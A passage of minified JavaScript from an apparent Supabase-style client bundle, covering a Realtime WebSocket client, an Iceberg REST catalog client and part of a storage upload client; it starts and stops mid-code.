n=e.toLocaleLowerCase();return this.bindings[n]&&(this.bindings[n]=this.bindings[n].filter(e=>{var r;return!((null===(r=e.type)||void 0===r?void 0:r.toLocaleLowerCase())===n&&Ct.isEqual(e.filter,t))})),this}static isEqual(e,t){if(Object.keys(e).length!==Object.keys(t).length)return!1;for(const n in e)if(e[n]!==t[n])return!1;return!0}static isFilterValueEqual(e,t){return(null!==e&&void 0!==e?e:void 0)===(null!==t&&void 0!==t?t:void 0)}_rejoinUntilConnected(){this.rejoinTimer.scheduleTimeout(),this.socket.isConnected()&&this._rejoin()}_onClose(e){this._on(ot.close,{},e)}_onError(e){this._on(ot.error,{},t=>e(t))}_canPush(){return this.socket.isConnected()&&this._isJoined()}_rejoin(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.timeout;this._isLeaving()||(this.socket._leaveOpenTopic(this.topic),this.state=st.joining,this.joinPush.resend(e))}_getPayloadRecords(e){const t={new:{},old:{}};return"INSERT"!==e.type&&"UPDATE"!==e.type||(t.new=ht(e.columns,e.record)),"UPDATE"!==e.type&&"DELETE"!==e.type||(t.old=ht(e.columns,e.old_record)),t}}const Nt=()=>{},Rt=25e3,Pt=10,Ot=100,At=[1e3,2e3,5e3,1e4];class It{constructor(e,t){var n;if(this.accessTokenValue=null,this.apiKey=null,this._manuallySetToken=!1,this.channels=new Array,this.endPoint="",this.httpEndpoint="",this.headers={},this.params={},this.timeout=rt,this.transport=null,this.heartbeatIntervalMs=Rt,this.heartbeatTimer=void 0,this.pendingHeartbeatRef=null,this.heartbeatCallback=Nt,this.ref=0,this.reconnectTimer=null,this.vsn=nt,this.logger=Nt,this.conn=null,this.sendBuffer=[],this.serializer=new ut,this.stateChangeCallbacks={open:[],close:[],error:[],message:[]},this.accessToken=null,this._connectionState="disconnected",this._wasManualDisconnect=!1,this._authPromise=null,this._heartbeatSentAt=null,this._resolveFetch=e=>e?function(){return e(...arguments)}:function(){return fetch(...arguments)},!(null===(n=null===t||void 0===t?void 0:t.params)||void 0===n?void 0:n.apikey))throw new Error("API key is required to connect to Realtime");this.apiKey=t.params.apikey,this.endPoint="".concat(e,"/").concat(it.websocket),this.httpEndpoint=_t(e),this._initializeOptions(t),this._setupReconnectionTimer(),this.fetch=this._resolveFetch(null===t||void 0===t?void 0:t.fetch)}connect(){if(!(this.isConnecting()||this.isDisconnecting()||null!==this.conn&&this.isConnected())){if(this._setConnectionState("connecting"),this.accessToken&&!this._authPromise&&this._setAuthSafely("connect"),this.transport)this.conn=new this.transport(this.endpointURL());else try{this.conn=Ze.createWebSocket(this.endpointURL())}catch(e){this._setConnectionState("disconnected");const t=e.message;if(t.includes("Node.js"))throw new Error("".concat(t,"\n\n")+'To use Realtime in Node.js, you need to provide a WebSocket implementation:\n\nOption 1: Use Node.js 22+ which has native WebSocket support\nOption 2: Install and provide the "ws" package:\n\n  npm install ws\n\n  import ws from "ws"\n  const client = new RealtimeClient(url, {\n    ...options,\n    transport: ws\n  })');throw new Error("WebSocket not available: ".concat(t))}this._setupConnectionHandlers()}}endpointURL(){return this._appendParams(this.endPoint,Object.assign({},this.params,{vsn:this.vsn}))}disconnect(e,t){if(!this.isDisconnecting())if(this._setConnectionState("disconnecting",!0),this.conn){const n=setTimeout(()=>{this._setConnectionState("disconnected")},100);this.conn.onclose=()=>{clearTimeout(n),this._setConnectionState("disconnected")},"function"===typeof this.conn.close&&(e?this.conn.close(e,null!==t&&void 0!==t?t:""):this.conn.close()),this._teardownConnection()}else this._setConnectionState("disconnected")}getChannels(){return this.channels}async removeChannel(e){const t=await e.unsubscribe();return 0===this.channels.length&&this.disconnect(),t}async removeAllChannels(){const e=await Promise.all(this.channels.map(e=>e.unsubscribe()));return this.channels=[],this.disconnect(),e}log(e,t,n){this.logger(e,t,n)}connectionState(){switch(this.conn&&this.conn.readyState){case at.connecting:return lt.Connecting;case at.open:return lt.Open;case at.closing:return lt.Closing;default:return lt.Closed}}isConnected(){return this.connectionState()===lt.Open}isConnecting(){return"connecting"===this._connectionState}isDisconnecting(){return"disconnecting"===this._connectionState}channel(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{config:{}};const n="realtime:".concat(e),r=this.getChannels().find(e=>e.topic===n);if(r)return r;{const n=new Ct("realtime:".concat(e),t,this);return this.channels.push(n),n}}push(e){const{topic:t,event:n,payload:r,ref:a}=e,s=()=>{this.encode(e,e=>{var t;null===(t=this.conn)||void 0===t||t.send(e)})};this.log("push","".concat(t," ").concat(n," (").concat(a,")"),r),this.isConnected()?s():this.sendBuffer.push(s)}async setAuth(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:null;this._authPromise=this._performAuth(e);try{await this._authPromise}finally{this._authPromise=null}}_isManualToken(){return this._manuallySetToken}async sendHeartbeat(){var e;if(this.isConnected()){if(this.pendingHeartbeatRef){this.pendingHeartbeatRef=null,this._heartbeatSentAt=null,this.log("transport","heartbeat timeout. Attempting to re-establish connection");try{this.heartbeatCallback("timeout")}catch(Oa){this.log("error","error in heartbeat callback",Oa)}return this._wasManualDisconnect=!1,null===(e=this.conn)||void 0===e||e.close(1e3,"heartbeat timeout"),void setTimeout(()=>{var e;this.isConnected()||null===(e=this.reconnectTimer)||void 0===e||e.scheduleTimeout()},Ot)}this._heartbeatSentAt=Date.now(),this.pendingHeartbeatRef=this._makeRef(),this.push({topic:"phoenix",event:"heartbeat",payload:{},ref:this.pendingHeartbeatRef});try{this.heartbeatCallback("sent")}catch(Oa){this.log("error","error in heartbeat callback",Oa)}this._setAuthSafely("heartbeat")}else try{this.heartbeatCallback("disconnected")}catch(Oa){this.log("error","error in heartbeat callback",Oa)}}onHeartbeat(e){this.heartbeatCallback=e}flushSendBuffer(){this.isConnected()&&this.sendBuffer.length>0&&(this.sendBuffer.forEach(e=>e()),this.sendBuffer=[])}_makeRef(){let e=this.ref+1;return e===this.ref?this.ref=0:this.ref=e,this.ref.toString()}_leaveOpenTopic(e){let t=this.channels.find(t=>t.topic===e&&(t._isJoined()||t._isJoining()));t&&(this.log("transport",'leaving duplicate topic "'.concat(e,'"')),t.unsubscribe())}_remove(e){this.channels=this.channels.filter(t=>t.topic!==e.topic)}_onConnMessage(e){this.decode(e.data,e=>{if("phoenix"===e.topic&&"phx_reply"===e.event&&e.ref&&e.ref===this.pendingHeartbeatRef){const t=this._heartbeatSentAt?Date.now()-this._heartbeatSentAt:void 0;try{this.heartbeatCallback("ok"===e.payload.status?"ok":"error",t)}catch(Oa){this.log("error","error in heartbeat callback",Oa)}this._heartbeatSentAt=null,this.pendingHeartbeatRef=null}const{topic:t,event:n,payload:r,ref:a}=e,s=a?"(".concat(a,")"):"",o=r.status||"";this.log("receive","".concat(o," ").concat(t," ").concat(n," ").concat(s).trim(),r),this.channels.filter(e=>e._isMember(t)).forEach(e=>e._trigger(n,r,a)),this._triggerStateCallbacks("message",e)})}_clearTimer(e){var t;"heartbeat"===e&&this.heartbeatTimer?(clearInterval(this.heartbeatTimer),this.heartbeatTimer=void 0):"reconnect"===e&&(null===(t=this.reconnectTimer)||void 0===t||t.reset())}_clearAllTimers(){this._clearTimer("heartbeat"),this._clearTimer("reconnect")}_setupConnectionHandlers(){this.conn&&("binaryType"in this.conn&&(this.conn.binaryType="arraybuffer"),this.conn.onopen=()=>this._onConnOpen(),this.conn.onerror=e=>this._onConnError(e),this.conn.onmessage=e=>this._onConnMessage(e),this.conn.onclose=e=>this._onConnClose(e),this.conn.readyState===at.open&&this._onConnOpen())}_teardownConnection(){if(this.conn){if(this.conn.readyState===at.open||this.conn.readyState===at.connecting)try{this.conn.close()}catch(Oa){this.log("error","Error closing connection",Oa)}this.conn.onopen=null,this.conn.onerror=null,this.conn.onmessage=null,this.conn.onclose=null,this.conn=null}this._clearAllTimers(),this._terminateWorker(),this.channels.forEach(e=>e.teardown())}_onConnOpen(){this._setConnectionState("connected"),this.log("transport","connected to ".concat(this.endpointURL()));(this._authPromise||(this.accessToken&&!this.accessTokenValue?this.setAuth():Promise.resolve())).then(()=>{this.flushSendBuffer()}).catch(e=>{this.log("error","error waiting for auth on connect",e),this.flushSendBuffer()}),this._clearTimer("reconnect"),this.worker?this.workerRef||this._startWorkerHeartbeat():this._startHeartbeat(),this._triggerStateCallbacks("open")}_startHeartbeat(){this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.heartbeatTimer=setInterval(()=>this.sendHeartbeat(),this.heartbeatIntervalMs)}_startWorkerHeartbeat(){this.workerUrl?this.log("worker","starting worker for from ".concat(this.workerUrl)):this.log("worker","starting default worker");const e=this._workerObjectUrl(this.workerUrl);this.workerRef=new Worker(e),this.workerRef.onerror=e=>{this.log("worker","worker error",e.message),this._terminateWorker()},this.workerRef.onmessage=e=>{"keepAlive"===e.data.event&&this.sendHeartbeat()},this.workerRef.postMessage({event:"start",interval:this.heartbeatIntervalMs})}_terminateWorker(){this.workerRef&&(this.log("worker","terminating worker"),this.workerRef.terminate(),this.workerRef=void 0)}_onConnClose(e){var t;this._setConnectionState("disconnected"),this.log("transport","close",e),this._triggerChanError(),this._clearTimer("heartbeat"),this._wasManualDisconnect||null===(t=this.reconnectTimer)||void 0===t||t.scheduleTimeout(),this._triggerStateCallbacks("close",e)}_onConnError(e){this._setConnectionState("disconnected"),this.log("transport","".concat(e)),this._triggerChanError(),this._triggerStateCallbacks("error",e);try{this.heartbeatCallback("error")}catch(Oa){this.log("error","error in heartbeat callback",Oa)}}_triggerChanError(){this.channels.forEach(e=>e._trigger(ot.error))}_appendParams(e,t){if(0===Object.keys(t).length)return e;const n=e.match(/\?/)?"&":"?",r=new URLSearchParams(t);return"".concat(e).concat(n).concat(r)}_workerObjectUrl(e){let t;if(e)t=e;else{const e=new Blob(['\n  addEventListener("message", (e) => {\n    if (e.data.event === "start") {\n      setInterval(() => postMessage({ event: "keepAlive" }), e.data.interval);\n    }\n  });'],{type:"application/javascript"});t=URL.createObjectURL(e)}return t}_setConnectionState(e){let t=arguments.length>1&&void 0!==arguments[1]&&arguments[1];this._connectionState=e,"connecting"===e?this._wasManualDisconnect=!1:"disconnecting"===e&&(this._wasManualDisconnect=t)}async _performAuth(){let e,t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:null,n=!1;if(t)e=t,n=!0;else if(this.accessToken)try{e=await this.accessToken()}catch(Oa){this.log("error","Error fetching access token from callback",Oa),e=this.accessTokenValue}else e=this.accessTokenValue;n?this._manuallySetToken=!0:this.accessToken&&(this._manuallySetToken=!1),this.accessTokenValue!=e&&(this.accessTokenValue=e,this.channels.forEach(t=>{const n={access_token:e,version:et};e&&t.updateJoinPayload(n),t.joinedOnce&&t._isJoined()&&t._push(ot.access_token,{access_token:e})}))}async _waitForAuthIfNeeded(){this._authPromise&&await this._authPromise}_setAuthSafely(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"general";this._isManualToken()||this.setAuth().catch(t=>{this.log("error","Error setting auth in ".concat(e),t)})}_triggerStateCallbacks(e,t){try{this.stateChangeCallbacks[e].forEach(n=>{try{n(t)}catch(Oa){this.log("error","error in ".concat(e," callback"),Oa)}})}catch(Oa){this.log("error","error triggering ".concat(e," callbacks"),Oa)}}_setupReconnectionTimer(){this.reconnectTimer=new dt(async()=>{setTimeout(async()=>{await this._waitForAuthIfNeeded(),this.isConnected()||this.connect()},Pt)},this.reconnectAfterMs)}_initializeOptions(e){var t,n,r,a,s,o,i,l,c,u,d,h;switch(this.transport=null!==(t=null===e||void 0===e?void 0:e.transport)&&void 0!==t?t:null,this.timeout=null!==(n=null===e||void 0===e?void 0:e.timeout)&&void 0!==n?n:rt,this.heartbeatIntervalMs=null!==(r=null===e||void 0===e?void 0:e.heartbeatIntervalMs)&&void 0!==r?r:Rt,this.worker=null!==(a=null===e||void 0===e?void 0:e.worker)&&void 0!==a&&a,this.accessToken=null!==(s=null===e||void 0===e?void 0:e.accessToken)&&void 0!==s?s:null,this.heartbeatCallback=null!==(o=null===e||void 0===e?void 0:e.heartbeatCallback)&&void 0!==o?o:Nt,this.vsn=null!==(i=null===e||void 0===e?void 0:e.vsn)&&void 0!==i?i:nt,(null===e||void 0===e?void 0:e.params)&&(this.params=e.params),(null===e||void 0===e?void 0:e.logger)&&(this.logger=e.logger),((null===e||void 0===e?void 0:e.logLevel)||(null===e||void 0===e?void 0:e.log_level))&&(this.logLevel=e.logLevel||e.log_level,this.params=Object.assign(Object.assign({},this.params),{log_level:this.logLevel})),this.reconnectAfterMs=null!==(l=null===e||void 0===e?void 0:e.reconnectAfterMs)&&void 0!==l?l:e=>At[e-1]||1e4,this.vsn){case"1.0.0":this.encode=null!==(c=null===e||void 0===e?void 0:e.encode)&&void 0!==c?c:(e,t)=>t(JSON.stringify(e)),this.decode=null!==(u=null===e||void 0===e?void 0:e.decode)&&void 0!==u?u:(e,t)=>t(JSON.parse(e));break;case tt:this.encode=null!==(d=null===e||void 0===e?void 0:e.encode)&&void 0!==d?d:this.serializer.encode.bind(this.serializer),this.decode=null!==(h=null===e||void 0===e?void 0:e.decode)&&void 0!==h?h:this.serializer.decode.bind(this.serializer);break;default:throw new Error("Unsupported serializer version: ".concat(this.vsn))}if(this.worker){if("undefined"!==typeof window&&!window.Worker)throw new Error("Web Worker is not supported");this.workerUrl=null===e||void 0===e?void 0:e.workerUrl}}}function Lt(e){return Lt="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},Lt(e)}function Dt(e){var t=function(e,t){if("object"!=Lt(e)||!e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var r=n.call(e,t||"default");if("object"!=Lt(r))return r;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}(e,"string");return"symbol"==Lt(t)?t:t+""}function Ut(e,t,n){return(t=Dt(t))in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function Mt(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),n.push.apply(n,r)}return n}function zt(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?Mt(Object(n),!0).forEach(function(t){Ut(e,t,n[t])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):Mt(Object(n)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))})}return e}var Bt=class extends Error{constructor(e,t){var n;super(e),this.name="IcebergError",this.status=t.status,this.icebergType=t.icebergType,this.icebergCode=t.icebergCode,this.details=t.details,this.isCommitStateUnknown="CommitStateUnknownException"===t.icebergType||[500,502,504].includes(t.status)&&!0===(null===(n=t.icebergType)||void 0===n?void 0:n.includes("CommitState"))}isNotFound(){return 404===this.status}isConflict(){return 409===this.status}isAuthenticationTimeout(){return 419===this.status}};function Ft(e){var t;const n=null!==(t=e.fetchImpl)&&void 0!==t?t:globalThis.fetch;return{async request(t){let{method:r,path:a,query:s,body:o,headers:i}=t;const l=function(e,t,n){const r=new URL(t,e);if(n)for(const[a,s]of Object.entries(n))void 0!==s&&r.searchParams.set(a,s);return r.toString()}(e.baseUrl,a,s),c=await async function(e){return e&&"none"!==e.type?"bearer"===e.type?{Authorization:"Bearer ".concat(e.token)}:"header"===e.type?{[e.name]:e.value}:"custom"===e.type?await e.getHeaders():{}:{}}(e.auth),u=await n(l,{method:r,headers:zt(zt(zt({},o?{"Content-Type":"application/json"}:{}),c),i),body:o?JSON.stringify(o):void 0}),d=await u.text(),h=(u.headers.get("content-type")||"").includes("application/json"),f=h&&d?JSON.parse(d):d;if(!u.ok){var p;const e=h?f:void 0,t=null===e||void 0===e?void 0:e.error;throw new Bt(null!==(p=null===t||void 0===t?void 0:t.message)&&void 0!==p?p:"Request failed with status ".concat(u.status),{status:u.status,icebergType:null===t||void 0===t?void 0:t.type,icebergCode:null===t||void 0===t?void 0:t.code,details:e})}return{status:u.status,headers:u.headers,data:f}}}}function Vt(e){return e.join("\x1f")}var qt=class{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"";this.client=e,this.prefix=t}async listNamespaces(e){const t=e?{parent:Vt(e.namespace)}:void 0;return(await this.client.request({method:"GET",path:"".concat(this.prefix,"/namespaces"),query:t})).data.namespaces.map(e=>({namespace:e}))}async createNamespace(e,t){const n={namespace:e.namespace,properties:null===t||void 0===t?void 0:t.properties};return(await this.client.request({method:"POST",path:"".concat(this.prefix,"/namespaces"),body:n})).data}async dropNamespace(e){await this.client.request({method:"DELETE",path:"".concat(this.prefix,"/namespaces/").concat(Vt(e.namespace))})}async loadNamespaceMetadata(e){return{properties:(await this.client.request({method:"GET",path:"".concat(this.prefix,"/namespaces/").concat(Vt(e.namespace))})).data.properties}}async namespaceExists(e){try{return await this.client.request({method:"HEAD",path:"".concat(this.prefix,"/namespaces/").concat(Vt(e.namespace))}),!0}catch(t){if(t instanceof Bt&&404===t.status)return!1;throw t}}async createNamespaceIfNotExists(e,t){try{return await this.createNamespace(e,t)}catch(n){if(n instanceof Bt&&409===n.status)return;throw n}}};function Wt(e){return e.join("\x1f")}var Ht=class{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"",n=arguments.length>2?arguments[2]:void 0;this.client=e,this.prefix=t,this.accessDelegation=n}async listTables(e){return(await this.client.request({method:"GET",path:"".concat(this.prefix,"/namespaces/").concat(Wt(e.namespace),"/tables")})).data.identifiers}async createTable(e,t){const n={};this.accessDelegation&&(n["X-Iceberg-Access-Delegation"]=this.accessDelegation);return(await this.client.request({method:"POST",path:"".concat(this.prefix,"/namespaces/").concat(Wt(e.namespace),"/tables"),body:t,headers:n})).data.metadata}async updateTable(e,t){const n=await this.client.request({method:"POST",path:"".concat(this.prefix,"/namespaces/").concat(Wt(e.namespace),"/tables/").concat(e.name),body:t});return{"metadata-location":n.data["metadata-location"],metadata:n.data.metadata}}async dropTable(e,t){var n;await this.client.request({method:"DELETE",path:"".concat(this.prefix,"/namespaces/").concat(Wt(e.namespace),"/tables/").concat(e.name),query:{purgeRequested:String(null!==(n=null===t||void 0===t?void 0:t.purge)&&void 0!==n&&n)}})}async loadTable(e){const t={};this.accessDelegation&&(t["X-Iceberg-Access-Delegation"]=this.accessDelegation);return(await this.client.request({method:"GET",path:"".concat(this.prefix,"/namespaces/").concat(Wt(e.namespace),"/tables/").concat(e.name),headers:t})).data.metadata}async tableExists(e){const t={};this.accessDelegation&&(t["X-Iceberg-Access-Delegation"]=this.accessDelegation);try{return await this.client.request({method:"HEAD",path:"".concat(this.prefix,"/namespaces/").concat(Wt(e.namespace),"/tables/").concat(e.name),headers:t}),!0}catch(n){if(n instanceof Bt&&404===n.status)return!1;throw n}}async createTableIfNotExists(e,t){try{return await this.createTable(e,t)}catch(n){if(n instanceof Bt&&409===n.status)return await this.loadTable({namespace:e.namespace,name:t.name});throw n}}},Kt=class{constructor(e){var t;let n="v1";e.catalogName&&(n+="/".concat(e.catalogName));const r=e.baseUrl.endsWith("/")?e.baseUrl:"".concat(e.baseUrl,"/");this.client=Ft({baseUrl:r,auth:e.auth,fetchImpl:e.fetch}),this.accessDelegation=null===(t=e.accessDelegation)||void 0===t?void 0:t.join(","),this.namespaceOps=new qt(this.client,n),this.tableOps=new Ht(this.client,n,this.accessDelegation)}async listNamespaces(e){return this.namespaceOps.listNamespaces(e)}async createNamespace(e,t){return this.namespaceOps.createNamespace(e,t)}async dropNamespace(e){await this.namespaceOps.dropNamespace(e)}async loadNamespaceMetadata(e){return this.namespaceOps.loadNamespaceMetadata(e)}async listTables(e){return this.tableOps.listTables(e)}async createTable(e,t){return this.tableOps.createTable(e,t)}async updateTable(e,t){return this.tableOps.updateTable(e,t)}async dropTable(e,t){await this.tableOps.dropTable(e,t)}async loadTable(e){return this.tableOps.loadTable(e)}async namespaceExists(e){return this.namespaceOps.namespaceExists(e)}async tableExists(e){return this.tableOps.tableExists(e)}async createNamespaceIfNotExists(e,t){return this.namespaceOps.createNamespaceIfNotExists(e,t)}async createTableIfNotExists(e,t){return this.tableOps.createTableIfNotExists(e,t)}};var Gt=class extends Error{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"storage",n=arguments.length>2?arguments[2]:void 0,r=arguments.length>3?arguments[3]:void 0;super(e),this.__isStorageError=!0,this.namespace=t,this.name="vectors"===t?"StorageVectorsError":"StorageError",this.status=n,this.statusCode=r}};function Jt(e){return"object"===typeof e&&null!==e&&"__isStorageError"in e}var $t=class extends Gt{constructor(e,t,n){let r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:"storage";super(e,r,t,n),this.name="vectors"===r?"StorageVectorsApiError":"StorageApiError",this.status=t,this.statusCode=n}toJSON(){return{name:this.name,message:this.message,status:this.status,statusCode:this.statusCode}}},Qt=class extends Gt{constructor(e,t){let n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:"storage";super(e,n),this.name="vectors"===n?"StorageVectorsUnknownError":"StorageUnknownError",this.originalError=t}};const Yt=e=>{if(Array.isArray(e))return e.map(e=>Yt(e));if("function"===typeof e||e!==Object(e))return e;const t={};return Object.entries(e).forEach(e=>{let[n,r]=e;const a=n.replace(/([-_][a-z])/gi,e=>e.toUpperCase().replace(/[-_]/g,""));t[a]=Yt(r)}),t};function Xt(e){return(Xt="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function Zt(e){var t=function(e,t){if("object"!=Xt(e)||!e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var r=n.call(e,t||"default");if("object"!=Xt(r))return r;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}(e,"string");return"symbol"==Xt(t)?t:t+""}function en(e,t,n){return(t=Zt(t))in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function tn(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),n.push.apply(n,r)}return n}function nn(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?tn(Object(n),!0).forEach(function(t){en(e,t,n[t])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):tn(Object(n)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))})}return e}const rn=e=>{var t;return e.msg||e.message||e.error_description||("string"===typeof e.error?e.error:null===(t=e.error)||void 0===t?void 0:t.message)||JSON.stringify(e)},an=(e,t,n,r)=>{const a={method:e,headers:(null===t||void 0===t?void 0:t.headers)||{}};return"GET"!==e&&"HEAD"!==e&&r?((e=>{if("object"!==typeof e||null===e)return!1;const t=Object.getPrototypeOf(e);return(null===t||t===Object.prototype||null===Object.getPrototypeOf(t))&&!(Symbol.toStringTag in e)&&!(Symbol.iterator in e)})(r)?(a.headers=nn({"Content-Type":"application/json"},null===t||void 0===t?void 0:t.headers),a.body=JSON.stringify(r)):a.body=r,(null===t||void 0===t?void 0:t.duplex)&&(a.duplex=t.duplex),nn(nn({},a),n)):nn(nn({},a),n)};async function sn(e,t,n,r,a,s,o){return new Promise((i,l)=>{e(n,an(t,r,a,s)).then(e=>{if(!e.ok)throw e;if(null===r||void 0===r?void 0:r.noResolveJson)return e;if("vectors"===o){const t=e.headers.get("content-type");if("0"===e.headers.get("content-length")||204===e.status)return{};if(!t||!t.includes("application/json"))return{}}return e.json()}).then(e=>i(e)).catch(e=>(async(e,t,n,r)=>{if(e&&"object"===typeof e&&"status"in e&&"ok"in e&&"number"===typeof e.status&&!(null===n||void 0===n?void 0:n.noResolveJson)){const n=e,a=n.status||500;if("function"===typeof n.json)n.json().then(e=>{const n=(null===e||void 0===e?void 0:e.statusCode)||(null===e||void 0===e?void 0:e.code)||a+"";t(new $t(rn(e),a,n,r))}).catch(()=>{if("vectors"===r){const e=a+"";t(new $t(n.statusText||"HTTP ".concat(a," error"),a,e,r))}else{const e=a+"";t(new $t(n.statusText||"HTTP ".concat(a," error"),a,e,r))}});else{const e=a+"";t(new $t(n.statusText||"HTTP ".concat(a," error"),a,e,r))}}else t(new Qt(rn(e),e,r))})(e,l,r,o))})}function on(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"storage";return{get:async(t,n,r,a)=>sn(t,"GET",n,r,a,void 0,e),post:async(t,n,r,a,s)=>sn(t,"POST",n,a,s,r,e),put:async(t,n,r,a,s)=>sn(t,"PUT",n,a,s,r,e),head:async(t,n,r,a)=>sn(t,"HEAD",n,nn(nn({},r),{},{noResolveJson:!0}),a,void 0,e),remove:async(t,n,r,a,s)=>sn(t,"DELETE",n,a,s,r,e)}}const ln=on("storage"),{get:cn,post:un,put:dn,head:hn,remove:fn}=ln,pn=on("vectors");var mn=class{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=arguments.length>2?arguments[2]:void 0,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:"storage";var a;this.shouldThrowOnError=!1,this.url=e,this.headers=t,this.fetch=(a=n)?function(){return a(...arguments)}:function(){return fetch(...arguments)},this.namespace=r}throwOnError(){return this.shouldThrowOnError=!0,this}setHeader(e,t){return this.headers=nn(nn({},this.headers),{},{[e]:t}),this}async handleOperation(e){try{return{data:await e(),error:null}}catch(t){if(this.shouldThrowOnError)throw t;if(Jt(t))return{data:null,error:t};throw t}}},gn=class{constructor(e,t){this.downloadFn=e,this.shouldThrowOnError=t}then(e,t){return this.execute().then(e,t)}async execute(){try{return{data:(await this.downloadFn()).body,error:null}}catch(e){if(this.shouldThrowOnError)throw e;if(Jt(e))return{data:null,error:e};throw e}}};let vn;vn=Symbol.toStringTag;var yn=class{constructor(e,t){this.downloadFn=e,this.shouldThrowOnError=t,this[vn]="BlobDownloadBuilder",this.promise=null}asStream(){return new gn(this.downloadFn,this.shouldThrowOnError)}then(e,t){return this.getPromise().then(e,t)}catch(e){return this.getPromise().catch(e)}finally(e){return this.getPromise().finally(e)}getPromise(){return this.promise||(this.promise=this.execute()),this.promise}async execute(){try{return{data:await(await this.downloadFn()).blob(),error:null}}catch(e){if(this.shouldThrowOnError)throw e;if(Jt(e))return{data:null,error:e};throw e}}};const bn={limit:100,offset:0,sortBy:{column:"name",order:"asc"}},wn={cacheControl:"3600",contentType:"text/plain;charset=UTF-8",upsert:!1};var _n=class extends mn{constructor(e){let t=arguments.length>2?arguments[2]:void 0;super(e,arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},arguments.length>3?arguments[3]:void 0,"storage"),this.bucketId=t}async uploadOrUpdate(e,t,n,r){var a=this;return a.handleOperation(async()=>{let s;const o=nn(nn({},wn),r);let i=nn(nn({},a.headers),"POST"===e&&{"x-upsert":String(o.upsert)});const l=o.metadata;"undefined"!==typeof Blob&&n instanceof Blob?(s=new FormData,s.append("cacheControl",o.cacheControl),l&&s.append("metadata",a.encodeMetadata(l)),s.append("",n)):"undefined"!==typeof FormData&&n instanceof FormData?(s=n,s.has("cacheControl")||s.append("cacheControl",o.cacheControl),l&&!s.has("metadata")&&s.append("metadata",a.encodeMetadata(l))):(s=n,i["cache-control"]="max-age=".concat(o.cacheControl),i["content-type"]=o.contentType,l&&(i["x-metadata"]=a.toBase64(a.encodeMetadata(l))),("undefined"!==typeof ReadableStream&&s instanceof ReadableStream||s&&"object"===typeof s&&"pipe"in s&&"function"===typeof s.pipe)&&!o.duplex&&(o.duplex="half")),(null===r||void 0===r?void 0:r.headers)&&(i=nn(nn({},i),r.headers));const c=a._removeEmptyFolders(t),u=a._getFinalPath(c),d=await("PUT"==e?dn:un)(a.fetch,"".concat(a.url,"/object/").concat(u),s,nn({headers:i},(null===o||void 0===o?void 0:o.duplex)?{duplex:o.duplex}:{}));return{path:c,id:d.Id,fullPath:d.Key}})}async upload(e,t,n){return this.uploadOrUpdate("POST",e,t,n)}async uploadToSignedUrl(e,t,n,r){var a=this;const s=a._removeEmptyFolders(e),o=a._getFinalPath(s),i=new URL(a.url+"/object/upload/sign/".concat(o));return i.searchParams.set("token",t),a.handleOperation(async()=>{let e;const t=nn({upsert:wn.upsert},r),o=nn(nn({},a.headers),{"x-upsert":String(t.upsert)});return"undefined"!==typeof Blob&&n instanceof Blob?(e=new FormData,e.append("cacheControl",t.cacheControl),e.append("",n)):"undefined"!==typeof FormData&&n instanceof FormData?(e=n,e.append("cacheControl",t.cacheControl)):(e=n,o["cache-control"]="max-age=".concat(t.cacheControl),o["content-type"]=t.contentType),{path:s,fullPath:(await dn(a.fetch,i.toString(),e,{headers:o})).Key}})}async createSignedUploadUrl(e,t){var n=this;return n.handleOperation(async()=>{let r=n._getFinalPath(e);const a=nn({},n.headers);(null===t||void 0===t?void 0:t.upsert)&&(a["x-upsert"]="true");const s=await un(n.fetch,"".concat(n.url,"/object/upload/sign/").concat(r),{},{headers:a}),o=new URL(n.url+s.url),i=o.searchParams.get("token");if(!i)throw new Gt("No token returned by API");return{signedUrl:o.toString(),path:e,token:i}})}async update(e,t,n){return this.uploadOrUpdate("PUT",e,t,n)}async move(e,t,n){var r=this;return r.handleOperation(async()=>await un(r.fetch,"".concat(r.url,"/object/move"),{bucketId:r.bucketId,sourceKey:e,destinationKey:t,destinationBucket:null===n||void 0===n?void 0:n.destinationBucket},{headers:r.headers}))}async copy(e,t,n){var r=this;return 